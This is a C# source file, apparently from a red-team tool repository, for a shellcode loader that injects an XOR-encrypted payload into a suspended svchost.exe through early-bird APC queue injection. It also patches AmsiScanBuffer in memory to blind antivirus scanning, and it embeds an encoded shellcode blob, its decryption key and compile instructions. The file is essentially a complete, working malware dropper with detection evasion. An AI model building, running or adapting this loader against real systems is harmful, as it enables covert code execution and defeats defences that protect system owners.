
/*

Loader/dropper for execution of shellcode by injecting it into a legitimate svchost.exe process using the early bird variety of the APC Queue code injection technique

https://github.com/TartarusLabs/Expeditus
james.fell@tartaruslabs.com

To compile it: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:exe /out:expeditus.exe expeditus.cs

Refer to the README.md for full details

*/

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Expeditus
{
	public class Loader
	{
		// For the process injection we will need to import from kernel32.dll: CreateProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, OpenThread, QueueUserAPC, ResumeThread

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
		[DllImport("kernel32.dll")]
		private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/VirtualAllocEx.html
		[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
		[DllImport("kernel32.dll")]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/VirtualProtectEx.html
		[DllImport("kernel32.dll")]
		private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/OpenThread.html
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/QueueUserAPC.html
		[DllImport("kernel32.dll")]
		private static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
		[DllImport("kernel32.dll")]
		private static extern uint ResumeThread(IntPtr hThread);

		// Reference: https://www.pinvoke.net/default.aspx/Structures.PROCESS_INFORMATION	
		private struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public uint dwProcessId;
			public uint dwThreadId;
		}

		// Reference: https://www.pinvoke.net/default.aspx/Structures.STARTUPINFO
		private struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		// Simple encrypt/decrypt by XORing with a key 
		private static byte[] XORcrypt(byte[] ciphertext, byte[] key)
		{
			byte[] plaintext = ciphertext;

			for (int cipherchar = 0; cipherchar < ciphertext.Length; cipherchar++)
			{
				plaintext[cipherchar] = (byte)((uint)key[cipherchar % key.Length] ^ (uint)ciphertext[cipherchar]);
			}

			return plaintext;
		}

		// Create a new suspended svchost.exe process, copy the shellcode into it, add a pointer to the shellcode to the main thread's APC queue and then resume it
		private static void inject(byte[] buf)
		{
			IntPtr numberOfBytesWritten;
			uint oldProtect;

			STARTUPINFO si = new STARTUPINFO();
			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
			CreateProcess(@"C:\Windows\system32\svchost.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);	// CREATE_SUSPENDED = 0x00000004
			IntPtr targetBufPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x04);	// MEM_COMMIT = 0x1000, PAGE_READWRITE = 0x04
			WriteProcessMemory(pi.hProcess, targetBufPtr, buf, buf.Length, out numberOfBytesWritten);
			VirtualProtectEx(pi.hProcess, targetBufPtr, buf.Length, 0x20, out oldProtect);	// PAGE_EXECUTE_READ = 0x20
			IntPtr targetThreadPtr = OpenThread(0x0010, false, (int)pi.dwThreadId);	// SET_CONTEXT = 0x0010
			QueueUserAPC(targetBufPtr, targetThreadPtr, IntPtr.Zero);
			ResumeThread(pi.hThread);
		}

		public static void Main(string[] args)
		{

			// Encrypted shellcode. Paste the output of payload-encrypt.ps1 here
			string strEncryptedPayload = "lCfnjZWAr2RpZSk+JTk3OTksWLcNJ+87BSDkNnEt4z1EIe4aPyxm0iIlKVisIF6kxVkJE2ZFRSmurWQkaa6GhDcpPiziN0jkJlUtab/v6e1ob2Qh4KgbAyFkuD/vIX0s5CRJLGm/hz8tl6Yl4lHgJ2W/KFmmLFilxC6loGgpbqVRhR2eKGopTGchULQdtzwt7ihLLWi1Di7vZS0s5CR1LGm/JeJh4CdluSQwLjw3PDIuPCg8KTUs6olILjaWhTAuPTMt432NPpqXkDkg2x8cVjZWWm9kKDMh5oIh5ITPZWllIeaBINlqb2XSpcBuACgxIeaAJeyZLt4lEk5om7wp4YUMaGRobz0o30HvD2mavT80JFShIlWpLZevLOCnIJCkIeypLt6DarePm7wt4agOeSQwI+2LLeGWJdP8zRsFlrAg7qApZ2hvLdEGBQtkaWVobyU5JDgn7YsyPzgpWKUCYj0oNYqTAq4hTDtlaC3lK0Bxo2gHLOCDPj8lOSQ4LjQgmqguNCCaoCLtqCnhriXTHKRQ4pawIF62IZqi5Goo32DoeQmavdSEdE9iLt7P8NXym7wt66tMVWMUZeSShR1q3y52GgAOaTwp5r6WsA==";

			// Patch amsi.dll to reduce risk of AV detecting us 
			Amsipatch.amsipatch();

			// Decrypt the encrypted shellcode. Be sure to set the same key as used in payload-encrypt.ps1 here
			byte[] buf = XORcrypt(System.Convert.FromBase64String(strEncryptedPayload), Encoding.ASCII.GetBytes("hodie"));	

			// Inject our decrypted shellcode into a new svchost.exe process
			inject(buf);

		}

	}


	public class Amsipatch
	{

		// For modifying a specific procedure inside a library we will need to import from kernel32.dll: LoadLibrary, GetProcAddress, VirtualProtect

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/LoadLibrary.html
		[DllImport("kernel32")]
		private static extern IntPtr LoadLibrary(string name);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/GetProcAddress.html
		[DllImport("kernel32")]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Reference: https://www.pinvoke.net/default.aspx/kernel32/VirtualProtect.html
		[DllImport("kernel32")]
		private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		public static void amsipatch()
		{
			uint oldProtect;
			byte[] amsiScanBufferPatch = {0x83,0xE0,0x00,0x05,0x31,0x00,0x94,0x90,0x2D,0xDA,0xFF,0x8C,0x10,0xC3};	// See README.md for derivation of this

			IntPtr ptrUnpatchedProc = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
			VirtualProtect(ptrUnpatchedProc, (UIntPtr)amsiScanBufferPatch.Length, 0x40, out oldProtect);	// PAGE_EXECUTE_READWRITE = 0x40
			Marshal.Copy(amsiScanBufferPatch, 0, ptrUnpatchedProc, amsiScanBufferPatch.Length);
			VirtualProtect(ptrUnpatchedProc, (UIntPtr)amsiScanBufferPatch.Length, oldProtect, out oldProtect);
		}

	}

}